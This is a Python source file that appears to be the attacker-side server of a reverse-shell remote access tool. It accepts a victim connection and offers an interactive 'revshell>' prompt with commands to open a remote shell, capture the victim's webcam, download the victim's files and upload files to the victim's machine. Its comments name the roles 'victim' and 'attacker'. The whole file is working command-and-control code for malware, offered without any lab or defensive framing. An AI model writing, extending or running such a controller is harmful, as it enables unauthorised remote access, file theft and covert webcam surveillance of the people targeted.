from server import Server
from webcam import Webcam
from shell import Shell
from transfer import FileTransfer
from outputs import Output
import signal
import sys
import os
import re
import readline

def parse_command(command, server):
	if not command:
		server.send('')
		return None
	command = command.strip()
	if not command:
		return '\n', None
	server.send(command)

	command = re.split(' |\r|\t', command)
	cmd = command[0]
	args = command[1:]
	return cmd, args

class SimpleCompleter(object):

	def __init__(self, options):
		self.options = sorted(options)
		return

	def complete(self, text, state):
		response = None
		if state == 0:
			if text:
				self.matches = [s 
				for s in self.options
				if s and s.startswith(text)]
			else:
				self.matches = self.options[:]
		try:
			response = self.matches[state]
		except IndexError:
			response = None
		return response

def main_loop(server):
	readline.set_completer(SimpleCompleter(['shell', 'webcam', 'download', 'upload', 'exit']).complete)
	readline.parse_and_bind('tab: complete')
	while True:
		# signal.signal(signal.SIGINT, sigIntHandler)
		client_socket = server.get_client_socket()
		try:
			cmd = input("revshell> ")
		except EOFError:
			server.send("")
			return
		cmd, args = parse_command(cmd, server)
		if not cmd:
			return
		if cmd == '\n':
			continue
		if cmd == "shell":
			shell = Shell(server)
			shell.listener()
		elif cmd == "webcam":
			webcam = Webcam(client_socket)
			webcam.receive()
		elif cmd == "download":
			# Usage: download <file_of_victim> <path_of_attacker>
			transfer = FileTransfer(server)
			transfer.receive(args[1])
		elif cmd == "upload":
			# Usage: upload <file_of_attacker> <path_of_victim>
			transfer = FileTransfer(server)
			if transfer.send(args[0]) == 1:
				Output.error(f"{args[0]}: File not found")
			else:
				Output.success(f"Successfully uploaded {args[0]}")
		elif cmd == "exit":
			return
		else:
			print(server.recv())

def sigIntHandler(signum, frame):
	print("\nrevshell> ", end="")

def main():
	try:
		port = int(sys.argv[1])
	except ValueError:
		print("The given port is not a number.\nUsage: python3 revshell-server.py <port>")
		exit(1)
	server = Server('0.0.0.0', port)
	server.accept()
	main_loop(server)
	

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print("Usage: python3 revshell-server.py <port>")
		exit(1)
	main()